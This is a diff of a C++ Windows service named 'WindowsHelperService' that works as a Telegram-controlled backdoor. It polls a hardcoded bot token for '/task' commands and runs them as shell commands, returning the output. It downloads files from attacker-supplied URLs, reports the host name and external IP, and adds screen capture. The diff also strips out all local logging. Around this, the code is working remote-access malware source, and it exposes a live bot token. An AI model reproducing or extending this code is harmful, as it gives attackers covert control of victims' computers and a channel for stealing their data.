@@ -9,29 +9,32 @@
 #include <array>
 #include <memory>
 #include <algorithm>
+#include <shlwapi.h>
+#include <vector>
+#include <wingdi.h>
 
-
-std::ofstream logFile("ServiceLog.txt", std::ios::out | std::ios::app);
-
-void Log(const std::string& message) {
-    if (logFile.is_open()) {
-        logFile << message << std::endl;
-    }
-}
-
+// Global variables
 SERVICE_STATUS ServiceStatus;
 SERVICE_STATUS_HANDLE hStatus;
 SC_HANDLE hSCManager = NULL;
 SC_HANDLE hService = NULL;
 
+// Bot token for Telegram API
+std::wstring g_botToken = L"bot5658308935:AAHZpncxTTQJlnZ6CSWtoPuE6eoY04h3hWs";
+
+// Function declarations
+std::string GetExecutablePath();
+std::string ExtractFileNameFromURL(const std::string& url);
+bool DownloadFile(const std::string& url);
 void ServiceMain(int argc, LPTSTR* argv);
 void ControlHandler(DWORD request);
-int InitService();
-void SendMessage(const std::wstring& message_text);
-void OutputDebugStringWithMessage(const std::string& message);
-std::wstring ConvertToWideString(const std::string& input);
-std::string GetTelegramUpdates();
 DWORD ServiceWorkerThread(LPVOID lpParam);
+std::wstring ConvertToWideString(const std::string& input);
+std::string extractTaskCommandText(const std::string& json);
+std::string ExecuteCommand(const char* cmd);
+std::string GetTelegramUpdates();
+void SendMessage(const std::wstring& message_text);
+std::string TakeScreenshotAndSave(const std::string& filePath);
 
 #ifdef UNICODE
 #define SERVICE_NAME  L"WindowsHelperService"
@@ -41,32 +44,25 @@ DWORD ServiceWorkerThread(LPVOID lpParam);
 
 int _tmain(int argc, _TCHAR* argv[])
 {
-    AllocConsole();
-    freopen("CONOUT$", "w", stdout);
-    Log("Service starting...");
+    // Service setup
     SERVICE_TABLE_ENTRY ServiceTable[] = {
         {SERVICE_NAME, (LPSERVICE_MAIN_FUNCTION)ServiceMain},
         {NULL, NULL}
     };
 
+    // Start service control dispatcher
     if (StartServiceCtrlDispatcher(ServiceTable) == FALSE)
     {
         DWORD error = GetLastError();
-        if (error == ERROR_FAILED_SERVICE_CONTROLLER_CONNECT) {
-            Log("Error: StartServiceCtrlDispatcher failed - The program is not running as a service");
-        } else {
-            Log("Error: StartServiceCtrlDispatcher failed with error code " + std::to_string(error));
-        }
         return error;
     }
 
-    Log("Service ended successfully");
     return 0;
 }
 
 void ServiceMain(int argc, LPTSTR* argv)
 {
-    Log("Entering ServiceMain");
+    // Service initialization
     ServiceStatus.dwServiceType = SERVICE_WIN32;
     ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
     ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
@@ -75,77 +71,93 @@ void ServiceMain(int argc, LPTSTR* argv)
     hStatus = RegisterServiceCtrlHandler(SERVICE_NAME, ControlHandler);
     if (hStatus == NULL)
     {
-        Log("Error: RegisterServiceCtrlHandler failed");
         return;
     }
 
+    // Service running
     ServiceStatus.dwCurrentState = SERVICE_RUNNING;
     SetServiceStatus(hStatus, &ServiceStatus);
 
-    // The worker thread does the actual work of the service.
+    // Start worker thread
     HANDLE hThread = CreateThread(NULL, 0, ServiceWorkerThread, NULL, 0, NULL);
     if(hThread == NULL) {
-        Log("Error: Worker thread creation failed");
     } else {
-        Log("Worker thread created successfully");
     }
 
     WaitForSingleObject(hThread, INFINITE);
     CloseHandle(hThread);
 
-    Log("Exiting ServiceMain");
     return;
-}
-
-int InitService()
-{
-    Log("Initializing service");
-    // Initialization code here
-    return 0;
 }
 
 void ControlHandler(DWORD request)
 {
-    Log("Entering ControlHandler");
+    // Handle service control requests
     switch(request) {
         case SERVICE_CONTROL_STOP:
-            Log("Stopping service");
             ServiceStatus.dwWin32ExitCode = 0;
             ServiceStatus.dwCurrentState = SERVICE_STOPPED;
             SetServiceStatus(hStatus, &ServiceStatus);
-            Log("Service stopped");
             break;
         default:
-            Log("Request received: " + std::to_string(request));
             break;
     }
 }
 
-std::string ExtractTaskArgument(const std::string& json, long userId) {
-    std::istringstream jsonStream(json);
-    std::string line;
-    std::string lastCommand;
-    long lastUserId = 0;
-    
-    while (std::getline(jsonStream, line)) {
-        if (line.find("\"id\":") != std::string::npos && line.find(std::to_string(userId)) != std::string::npos) {
-            lastUserId = userId;
+std::string extractTaskCommandText(const std::string& json) {
+    std::string userIdPattern = "\"id\":304000003";
+    std::string taskCommandPattern = "\"text\":\"/task ";
+
+    // Поиск идентификатора пользователя
+    size_t userIdPos = json.find(userIdPattern);
+    if (userIdPos == std::string::npos) {
+        return ""; // ID пользователя не найден
+    }
+
+    // Поиск команды /task
+    size_t taskCommandPos = json.find(taskCommandPattern, userIdPos);
+    if (taskCommandPos == std::string::npos) {
+        return ""; // Команда /task не найдена
+    }
+
+    // Находим начало текста команды после "/task "
+    size_t textStart = taskCommandPos + taskCommandPattern.length();
+
+    // Ищем конец значения "text", учитывая возможные экранированные символы
+    size_t textEnd = textStart;
+    while (textEnd < json.length()) {
+        if (json[textEnd] == '\\' && textEnd + 1 < json.length()) {
+            textEnd += 2; // Пропускаем экранированный символ
+            continue;
+        } else if (json[textEnd] == '"') {
+            break; // Конец строки
         }
-        if (lastUserId == userId && line.find("\"text\":\"/") != std::string::npos) {
-            lastCommand = line;
+        textEnd++;
+    }
+
+    if (textEnd >= json.length()) {
+        return ""; // Конец текста не найден
+    }
+
+    // Извлечение текста
+    std::string extractedText = json.substr(textStart, textEnd - textStart);
+
+    // Обработка экранированных символов
+    std::string unescapedText;
+    for (size_t i = 0; i < extractedText.length(); ++i) {
+        if (extractedText[i] == '\\' && i + 1 < extractedText.length()) {
+            if (extractedText[i + 1] == '\\' || extractedText[i + 1] == '"') {
+                unescapedText += extractedText[i + 1];
+                ++i; // Пропускаем следующий символ, так как он уже добавлен
+            } else {
+                unescapedText += extractedText[i]; // Добавляем обычный слеш
+            }
+        } else {
+            unescapedText += extractedText[i];
         }
     }
 
-    // Извлекаем аргумент команды
-    size_t commandStart = lastCommand.find("/task");
-    if (commandStart != std::string::npos) {
-        size_t argumentStart = commandStart + 5; // 5 - длина строки "/task"
-        size_t argumentEnd = lastCommand.find("\"", argumentStart);
-        if (argumentEnd != std::string::npos) {
-            return lastCommand.substr(argumentStart, argumentEnd - argumentStart);
-        }
-    }
-    return "";
+    return unescapedText;
 }
 
 void OutputDebugStringWithMessage(const std::string& message) {
@@ -165,8 +177,8 @@ std::wstring ConvertToWideString(const std::string& input) {
 }
 
 void SendMessage(const std::wstring& message_text) {
-    std::wstring urlBase = L"https://api.telegram.org/bot5658308935:AAHZpncxTTQJlnZ6CSWtoPuE6eoY04h3hWs/sendMessage?chat_id=304000003&text=";
-    
+    std::wstring urlBase = L"https://api.telegram.org/"+ g_botToken + L"/sendMessage?chat_id=304000003&text=";
+
     // Определите максимальную длину сообщения, которую сервер Telegram поддерживает
     const int maxMessageLength = 4096;
 
@@ -185,7 +197,6 @@ void SendMessage(const std::wstring& message_text) {
             HINTERNET hInternet = InternetOpenW(L"TelegramBot", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
             if (!hInternet) {
                 OutputDebugStringWithMessage("Error: InternetOpenW failed");
-                Log("Error: InternetOpenW failed");
                 return;
             }
 
@@ -203,12 +214,10 @@ void SendMessage(const std::wstring& message_text) {
                 InternetCloseHandle(hConnect);
 
                 OutputDebugStringWithMessage("Server Response: " + serverResponse);
-                Log("Message sent successfully");
             } else {
                 DWORD error = GetLastError();
                 std::string errorMsg = "Failed to send message. Error code: " + std::to_string(error);
                 OutputDebugStringWithMessage(errorMsg);
-                Log(errorMsg);
             }
             InternetCloseHandle(hInternet);
 
@@ -222,7 +231,6 @@ void SendMessage(const std::wstring& message_text) {
         HINTERNET hInternet = InternetOpenW(L"TelegramBot", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
         if (!hInternet) {
             OutputDebugStringWithMessage("Error: InternetOpenW failed");
-            Log("Error: InternetOpenW failed");
             return;
         }
 
@@ -240,12 +248,10 @@ void SendMessage(const std::wstring& message_text) {
             InternetCloseHandle(hConnect);
 
             OutputDebugStringWithMessage("Server Response: " + serverResponse);
-            Log("Message sent successfully");
         } else {
             DWORD error = GetLastError();
             std::string errorMsg = "Failed to send message. Error code: " + std::to_string(error);
             OutputDebugStringWithMessage(errorMsg);
-            Log(errorMsg);
         }
         InternetCloseHandle(hInternet);
     }
@@ -259,9 +265,9 @@ std::string GetTelegramUpdates() {
         return "";
     }
 
-    std::wstring url = L"https://api.telegram.org/bot5658308935:AAHZpncxTTQJlnZ6CSWtoPuE6eoY04h3hWs/getUpdates";
+    // Запрос для получения всех обновлений
+    std::wstring url = L"https://api.telegram.org/" + g_botToken + L"/getUpdates";
     HINTERNET hConnect = InternetOpenUrlW(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
-
     if (hConnect) {
         char buffer[4096];
         DWORD bytesRead;
@@ -269,39 +275,80 @@ std::string GetTelegramUpdates() {
             responseData.append(buffer, bytesRead);
         }
         InternetCloseHandle(hConnect);
-    } else {
     }
     InternetCloseHandle(hInternet);
 
-    return responseData;
-}
-
-std::string extractBetween(const std::string& str, const std::string& startDelimiter, const std::string& stopDelimiter) {
-    unsigned firstDelimPos = str.find(startDelimiter) + startDelimiter.length();
-    unsigned endPos = str.find(stopDelimiter, firstDelimPos);
-    return str.substr(firstDelimPos, endPos - firstDelimPos);
-}
-
-
-bool IsProcessRunning(const wchar_t* processName) {
-    bool exists = false;
-    PROCESSENTRY32W entry;
-    entry.dwSize = sizeof(PROCESSENTRY32W);
-
-    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-
-    if (Process32FirstW(snapshot, &entry)) {
-        while (Process32NextW(snapshot, &entry)) {
-            if (_wcsicmp(entry.szExeFile, processName) == 0) {
-                exists = true;
-                break;
+    // Найти последнее обновление в responseData
+    std::string lastUpdate = "";
+    std::string updatePattern = "\"update_id\":";
+    size_t lastUpdatePos = responseData.rfind(updatePattern);
+    if (lastUpdatePos != std::string::npos) {
+        // Начало обновления
+        size_t updateStart = responseData.rfind('{', lastUpdatePos);
+        // Конец обновления
+        size_t braceCount = 1;
+        size_t updateEnd = lastUpdatePos;
+        while (braceCount > 0 && updateEnd < responseData.size()) {
+            updateEnd++;
+            if (responseData[updateEnd] == '{') {
+                braceCount++;
+            } else if (responseData[updateEnd] == '}') {
+                braceCount--;
             }
+        }
+
+        if (updateStart != std::string::npos && updateEnd < responseData.size()) {
+            lastUpdate = responseData.substr(updateStart, updateEnd - updateStart + 1);
         }
     }
 
-    CloseHandle(snapshot);
-    return exists;
+    return lastUpdate;
 }
+
+std::string ExtractFileNameFromURL(const std::string& url) {
+    const char* fileName = PathFindFileNameA(url.c_str());
+    return fileName ? std::string(fileName) : "";
+}
+
+bool DownloadFile(const std::string& url, const std::string& directoryPath) {
+    std::string fileName = ExtractFileNameFromURL(url);
+    std::string fullFilePath = directoryPath + "\\" + fileName;
+    
+    HINTERNET hInternet = InternetOpenA("Downloader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    if (!hInternet) {
+        return false;
+    }
+
+    HINTERNET hFile = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
+    if (!hFile) {
+        InternetCloseHandle(hInternet);
+        return false;
+    }
+
+    std::string responseData;
+    char buffer[4096];
+    DWORD bytesRead;
+    while (InternetReadFile(hFile, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
+        responseData.append(buffer, bytesRead);
+    }
+
+    InternetCloseHandle(hFile);
+    InternetCloseHandle(hInternet);
+
+    // Write data to a local file
+    HANDLE hLocalFile = CreateFileA(fullFilePath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hLocalFile == INVALID_HANDLE_VALUE) {
+        return false;
+    }
+
+    DWORD bytesWritten;
+    bool writeResult = WriteFile(hLocalFile, responseData.data(), responseData.size(), &bytesWritten, NULL);
+    CloseHandle(hLocalFile);
+
+    return writeResult && (bytesWritten == responseData.size());
+}
+
+
 
 std::string ExecuteCommand(const char* cmd) {
     std::array<char, 128> buffer;
@@ -316,52 +363,141 @@ std::string ExecuteCommand(const char* cmd) {
     return result;
 }
 
+std::string TakeScreenshotAndSave(const std::string& filePath) {
+    // Получаем размеры экрана
+    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
+    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
 
-void KillProcessByName(const wchar_t *filename) {
-    HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);
-    PROCESSENTRY32W pEntry;
-    pEntry.dwSize = sizeof(pEntry);
-    BOOL hRes = Process32FirstW(hSnapShot, &pEntry);
-    while (hRes) {
-        if (wcscmp(pEntry.szExeFile, filename) == 0) {
-            HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0, (DWORD)pEntry.th32ProcessID);
-            if (hProcess != NULL) {
-                TerminateProcess(hProcess, 9);
-                CloseHandle(hProcess);
-            }
-        }
-        hRes = Process32NextW(hSnapShot, &pEntry);
+    // Создаем контекст устройства
+    HDC hScreenDC = CreateDC(TEXT("DISPLAY"), NULL, NULL, NULL);
+    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
+    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, screenWidth, screenHeight);
+    HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);
+
+    // Копируем содержимое экрана в битмап
+    BitBlt(hMemoryDC, 0, 0, screenWidth, screenHeight, hScreenDC, 0, 0, SRCCOPY);
+    hBitmap = (HBITMAP)SelectObject(hMemoryDC, hOldBitmap);
+
+    // Сохраняем битмап в файл
+    BITMAPFILEHEADER bfHeader;
+    BITMAPINFOHEADER biHeader;
+    BITMAPINFO bInfo;
+    DWORD dwBytesWritten = 0;
+    HANDLE hFile = INVALID_HANDLE_VALUE;
+    std::vector<BYTE> lpbitmap;
+
+    hFile = CreateFileA(filePath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if(hFile == INVALID_HANDLE_VALUE) {
+        return "";
     }
-    CloseHandle(hSnapShot);
+
+    hBitmap = (HBITMAP)GetStockObject(DEFAULT_PALETTE);
+    GetObject(hBitmap, sizeof(BITMAPINFOHEADER), &biHeader);
+    biHeader.biBitCount = 24;
+    biHeader.biWidth = screenWidth;
+    biHeader.biHeight = screenHeight;
+    biHeader.biPlanes = 1;
+    biHeader.biSizeImage = screenWidth * screenHeight * 3;
+
+    bInfo.bmiHeader = biHeader;
+    lpbitmap.resize(biHeader.biSizeImage);
+
+    GetDIBits(hMemoryDC, hBitmap, 0, screenHeight, &lpbitmap[0], &bInfo, DIB_RGB_COLORS);
+
+    bfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
+    bfHeader.bfSize = bfHeader.bfOffBits + biHeader.biSizeImage;
+    bfHeader.bfType = 0x4D42;
+
+    WriteFile(hFile, &bfHeader, sizeof(BITMAPFILEHEADER), &dwBytesWritten, NULL);
+    WriteFile(hFile, &biHeader, sizeof(BITMAPINFOHEADER), &dwBytesWritten, NULL);
+    WriteFile(hFile, &lpbitmap[0], biHeader.biSizeImage, &dwBytesWritten, NULL);
+
+    CloseHandle(hFile);
+
+    // Очистка
+    DeleteDC(hMemoryDC);
+    DeleteDC(hScreenDC);
+    DeleteObject(hBitmap);
+
+    return filePath;
 }
 
 
+std::string GetComputerName() {
+    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
+    DWORD size = sizeof(computerName);
+    if (GetComputerNameA(computerName, &size)) {
+        return std::string(computerName);
+    }
+    return "Unknown";
+}
+
+// Функция для получения внешнего IP-адреса
+std::string GetExternalIP() {
+    HINTERNET hInternet, hFile;
+    std::string responseData;
+
+    hInternet = InternetOpenA("WinINet", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    if (!hInternet) return "";
+
+    hFile = InternetOpenUrlA(hInternet, "http://api.ipify.org", NULL, 0, INTERNET_FLAG_RELOAD, 0);
+    if (!hFile) {
+        InternetCloseHandle(hInternet);
+        return "";
+    }
+
+    char buffer[4096];
+    DWORD bytesRead;
+    while (InternetReadFile(hFile, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
+        responseData.append(buffer, bytesRead);
+    }
+
+    InternetCloseHandle(hFile);
+    InternetCloseHandle(hInternet);
+
+    return responseData;
+}
+
+// Функция для отправки сообщения о подключении нового пользователя
+void SendStartupMessage() {
+    std::string computerName = GetComputerName();
+    std::string externalIP = GetExternalIP();
+    std::wstring message = ConvertToWideString("New client connected: " + computerName + ", External IP: " + externalIP);
+    SendMessage(message);
+}
+
 DWORD ServiceWorkerThread(LPVOID lpParam) {
-    SendMessage(L"Worker thread started\n"); // Отправляем сообщение о старте в Телеграм
-    Log("Worker thread started");
+    SendStartupMessage();
 
     std::string lastExecutedArgument; // Переменная для хранения последнего выполненного аргумента
 
     while (ServiceStatus.dwCurrentState == SERVICE_RUNNING) { // Отправляем сообщение о цикле проверки в Телеграм
-        long userId = 304000003; // Замените на ID пользователя
 
         std::string json = GetTelegramUpdates();
-        std::string argument = ExtractTaskArgument(json, userId);
+        std::string argument = extractTaskCommandText(json);
 
         // Удаляем начальные и конечные пробелы из аргумента для сравнения
         argument.erase(std::begin(argument), std::find_if_not(argument.begin(), argument.end(), ::isspace));
         argument.erase(std::find_if_not(argument.rbegin(), argument.rend(), ::isspace).base(), argument.end());
 
-        if (argument != "skip") { // Проверяем, что аргумент не равен "skip"
+        if (argument.substr(0, 15) == "download_by_url") {
+            std::string url = argument.substr(16);
+            if (!url.empty()) {
+                std::string localFilePath = "C:\\Users"; // Путь, куда сохранить файл
+                if (DownloadFile(url, localFilePath)) {
+                    SendMessage(ConvertToWideString("File downloaded successfully"));
+                } else {
+                    SendMessage(ConvertToWideString("Failed to download file"));
+                }
+            }
+        } else if (argument != "skip") {
             std::string message = "Executing argument: " + argument;
             SendMessage(ConvertToWideString(message)); // Отправляем сообщение о выполнении аргумента в Телеграм
-            Log(message);
 
             std::string output = ExecuteCommand(argument.c_str());
             SendMessage(ConvertToWideString(output)); // Отправляем вывод команды в Телеграм
-            Log(output);
         }
-        
+
         // Sleep for a while before checking again
         Sleep(20000); // Check every 20 seconds
     }
